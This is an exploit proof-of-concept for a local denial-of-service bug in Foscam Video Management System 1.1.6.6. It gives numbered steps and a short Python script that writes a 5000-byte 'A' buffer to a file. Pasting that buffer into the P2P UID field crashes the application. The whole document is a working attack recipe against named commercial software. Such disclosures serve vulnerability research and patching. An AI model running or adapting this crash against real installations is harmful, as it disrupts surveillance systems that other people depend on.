# Exploit Title: Foscam Video Management System 1.1.6.6 - 'UID' Denial of Service (PoC)
# Author: Alessandro Magnosi
# Date: 09/10/2019
# Vendor Homepage: https://www.foscam.com/
# Software Link : https://www.foscam.com/downloads/appsoftware.html?id=5
# Tested Version: 1.1.6.6
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: Windows 7 SP1 x86 en, Windows 10 Pro x64 it

# Steps to Produce the Crash: 
# 1.- Run python code : python foscam-vms-uid-dos.py
# 2.- Open FoscamVMS1.1.6.txt and copy its content to clipboard
# 3.- Open FoscamVMS
# 4.- Go to Add Device
# 5.- Check the option P2P Connection
# 6.- Copy the content of the file into UID
# 7.- Click on Login Check
# 8.- Crashed

#!/usr/bin/python
 
buffer = "A" * 5000
f = open ("FoscamVMS1.1.6.txt", "w")
f.write(buffer)
f.close()
            